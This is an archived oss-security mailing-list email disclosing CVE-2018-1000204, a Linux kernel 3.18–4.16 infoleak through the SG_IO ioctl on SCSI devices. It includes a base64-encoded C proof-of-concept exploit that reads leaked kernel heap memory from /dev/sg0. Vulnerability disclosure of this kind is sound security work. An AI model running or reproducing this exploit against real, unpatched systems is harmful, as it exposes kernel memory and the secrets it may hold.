X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3823" "Friday" "8" "June" "2018" "19:38:27" "+0200" "Alexander Potapenko" "glider@google.com" "<CAG_fn=VEy8E4C4gTC2wZ-FSma5Lh5c5mtxTmhfdFKN_TSjvggQ@mail.gmail.com>" "83" "[oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect handling of SG_IO ioctl" nil nil nil "6" "2018060817:38:27" "[oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect handling of SG_IO ioctl" (number mark "U       glider@googl Jun  8   83/3823  " thread-indent "\"[oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect handling of SG_IO ioctl\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13628 invoked by uid 550); 8 Jun 2018 17:38:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13605 invoked from network); 8 Jun 2018 17:38:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=Fe97+x+PLAfNn95earKzfw/FHwgfYQNQ/zchO5YdWXY=;
        b=Ac7166AiGJ9XAub//mjePTanxqV1pg0kte1gmF76Q5l1xOEdq3+kWfHM25eG58Uh7v
         h3UaxgKPWOIxGFxIbxJ5AylBf6UwQoch7E23NOBn0PjUZyqGWVnFIQhHZhacYrlery0i
         C87h6uEuwrozZ5lAhlPOjbP/NvOTKVkzUzRgam/FkMrZp/nN2j9ddG3hes9SDCcLCU1U
         GgIiLnfTFmFeeD+rokXVlP4V5mEauRylfLN6aiLO+MpSbLBnwEokJxvZzwFWdSgILsTn
         WsT82Ol4ql+IA2E+LRnyIDni8iARhVRo6KwLqUfzfZvu9ucv6M5P7LKKIPmsaQCaTZEo
         BTYQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=Fe97+x+PLAfNn95earKzfw/FHwgfYQNQ/zchO5YdWXY=;
        b=J7EgWRsCoLQBlGx8PIF5ucB+QhzivRIyD7YKV9pbF6Awm3jhciwMjAd7wurCQBsq6p
         F2bfevcWw522yblnbQKjf5BMRAhLQn5+3TkarZD70A2RHM9Jms1BTJxwTEiofG1NLR7A
         T8d4rLsH8FKiFR9KrWK9ixijNS/h86YZbPpk7KiXdgesH/yHJ/EPvfVYxzsJHaceVcTx
         R7JGxtDEstVWTJWQyw9JmP2W1aFZ0YbeGjvOmJicIame2ihHva8qzcxzbh9fNoBmkTOm
         wuacvDhKLXendmaoL2UZNHNm1D5HjM1MgFWS/LeCwXTEdBdhVwSgOzaczqkrQDiWHNeK
         jkfQ==
X-Gm-Message-State: APt69E2bbAL+iXYb2Ti1UFJjlxPOHUZ748HEqPDoeOUGSP70AmHu3pIr
	w895m6/T0vddRDU/KZhgQBEvT3OUsY3gQPOmwOI+xjR7n4E=
X-Google-Smtp-Source: ADUXVKJ1e1ixb51GoUMyJltA0q2gwVyuPFyUbqlbFutGDVbEyqz6Br8c7b6s/hB/eAa7nbLrr5FLATCmYZ92LOcQjV0=
X-Received: by 2002:ab0:11e3:: with SMTP id q35-v6mr4784693uac.162.1528479519389;
 Fri, 08 Jun 2018 10:38:39 -0700 (PDT)
MIME-Version: 1.0
From: Alexander Potapenko <glider@google.com>
Date: Fri, 8 Jun 2018 19:38:27 +0200
Message-ID: <CAG_fn=VEy8E4C4gTC2wZ-FSma5Lh5c5mtxTmhfdFKN_TSjvggQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="000000000000cd5739056e24de81"
Subject: [oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect
 handling of SG_IO ioctl

--000000000000cd5739056e24de81
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi all,

Linux Kernel version 3.18 to 4.16 incorrectly handles an SG_IO ioctl
on /dev/sg0 (or any other SCSI device) with
dxfer_direction=3DSG_DXFER_FROM_DEV and an empty 6-byte cmdp.
This may lead to copying up to 1000 kernel heap pages to the userspace.
See the PoC exploit attached.

This bug has been fixed in the upstream kernel already:
https://github.com/torvalds/linux/commit/a45b599ad808c3c982fdcdc12b0b8611c2=
f92824,
and CVE-2018-1000204 has been assigned to it.

The problem has limited scope, as users don't usually have permissions
to access SCSI devices. On the other hand, e.g. the Nero user manual
suggests doing `chmod o+r+w /dev/sg*` to make the devices accessible.

--=20
Alexander Potapenko
Software Engineer

Google Germany GmbH
Erika-Mann-Stra=C3=9Fe, 33
80636 M=C3=BCnchen

Gesch=C3=A4ftsf=C3=BChrer: Paul Manicle, Halimah DeLaine Prado
Registergericht und -nummer: Hamburg, HRB 86891
Sitz der Gesellschaft: Hamburg

--000000000000cd5739056e24de81
Content-Type: text/x-csrc; charset="US-ASCII"; name="sg_io_leak.c"
Content-Disposition: attachment; filename="sg_io_leak.c"
Content-Transfer-Encoding: base64
Content-ID: <f_ji6956sg0>
X-Attachment-Id: f_ji6956sg0

I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxwdGhyZWFkLmg+CiNpbmNs
dWRlIDxzY3NpL3NnLmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8
c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy9p
b2N0bC5oPgoKI2RlZmluZSBDTURfU0laRSA2CgojZGVmaW5lIE1JTl9TVFJM
RU4gMQpwdGhyZWFkX211dGV4X3Qgb3V0X211dGV4ID0gUFRIUkVBRF9NVVRF
WF9JTklUSUFMSVpFUjsKCnZvaWQgZHVtcF9idWYodW5zaWduZWQgY2hhciAq
YnVmLCBpbnQgbGVuKSB7CiAgaW50IGksIG56ID0gMDsKICBmb3IgKGkgPSAw
OyBpIDwgbGVuOyBpKyspIHsKICAgIGlmIChidWZbaV0pIHsKICAgICAgbnog
PSAxOwogICAgICBicmVhazsKICAgIH0KICB9CiAgaWYgKCFueikKICAgIC8v
IFRoZSBidWZmZXIgaXMgZW1wdHkuCiAgICByZXR1cm47CgogIHB0aHJlYWRf
bXV0ZXhfbG9jaygmb3V0X211dGV4KTsKICBmb3IgKGkgPSAwOyBpIDwgbGVu
OyBpKyspIHsKICAgIGlmIChidWZbaV0pIHsKICAgICAgaW50IHN0cl9sZW4g
PSBzdHJsZW4oJmJ1ZltpXSk7CiAgICAgIC8vIFNob3J0IHN0cmluZyBwaWVj
ZXMgYXJlIHRvbyBib3JpbmcuCiAgICAgIGlmIChzdHJfbGVuID49IE1JTl9T
VFJMRU4pIHsKICAgICAgICB1bnNpZ25lZCBjaGFyICpjOwogICAgICAgIGZv
ciAoYyA9ICZidWZbaV07IGMgPCAmYnVmW2kgKyBzdHJfbGVuXTsgYysrKSB7
CiAgICAgICAgICBpZiAoKCpjID4gMTI3KSB8fCAoKCpjIDwgMzIpICYmICgq
YyAhPSAxMCkgJiYgKCpjICE9IDEzKSkpICB7CiAgICAgICAgICAgICpjID0g
JyAnOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgIH0KICAgICAg
ICB9CiAgICAgICAgLy8gRHVtcCB0aGUgYnVmZmVyLgogICAgICAgIGZwcmlu
dGYoc3RkZXJyLCAiJXNcbiIsICZidWZbaV0pOwogICAgICB9CiAgICAgIGkg
Kz0gc3RyX2xlbjsKICAgIH0KICB9CiAgcHRocmVhZF9tdXRleF91bmxvY2so
Jm91dF9tdXRleCk7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2
W10pCnsKICBpbnQgbnBhZ2VzID0gMTI4LCBwYWdlczsKICBpZiAoYXJnYyA+
IDEpIHsKICAgIHBhZ2VzID0gYXRvaShhcmd2WzFdKTsKICAgIGlmIChwYWdl
cyA+IDAgJiYgcGFnZXMgPCAxMDI0KQogICAgICBucGFnZXMgPSBwYWdlczsK
ICB9CiAgaW50IGJ1Zl9zaXplID0gNDA5NiAqIG5wYWdlczsKCiAgaW50IGZk
ID0gb3BlbigiL2Rldi9zZzAiLCBPX1JET05MWSk7CiAgaWYgKGZkID09IC0x
KSB7CiAgICBmcHJpbnRmKHN0ZGVyciwgIm9wZW4gZmFpbGVkIVxuIik7CiAg
ICByZXR1cm4gMTsKICB9CgogIGNoYXIgKm91dF9idWYgPSBjYWxsb2MoMSwg
YnVmX3NpemUpOwogIGlmICghb3V0X2J1ZikgewogICAgZnByaW50ZihzdGRl
cnIsICJjYWxsb2MgZmFpbGVkIVxuIik7CiAgICByZXR1cm4gMTsKICB9Cgog
IGNoYXIgY21kW0NNRF9TSVpFXSA9IHt9OwogIHN0cnVjdCBzZ19pb19oZHIg
aGRyOwogIG1lbXNldCgmaGRyLCAwLCBzaXplb2YoaGRyKSk7CiAgaGRyLmlu
dGVyZmFjZV9pZCA9ICdTJzsKICBoZHIuZHhmZXJfZGlyZWN0aW9uID0gU0df
RFhGRVJfRlJPTV9ERVY7CiAgaGRyLmNtZF9sZW4gPSBDTURfU0laRTsKICBo
ZHIuZHhmZXJfbGVuID0gYnVmX3NpemU7CiAgaGRyLmR4ZmVycCA9IG91dF9i
dWY7CiAgaGRyLmNtZHAgPSBjbWQ7CgogIGludCByZXQgPSBpb2N0bChmZCwg
U0dfSU8sICZoZHIpOwogIGlmIChyZXQgPT0gLTEpIHsKICAgIGZwcmludGYo
c3RkZXJyLCAiaW9jdGwgZmFpbGVkIVxuIik7CiAgfQogIGR1bXBfYnVmKG91
dF9idWYsIGJ1Zl9zaXplKTsKICByZXR1cm4gMDsKfQo=

--000000000000cd5739056e24de81--
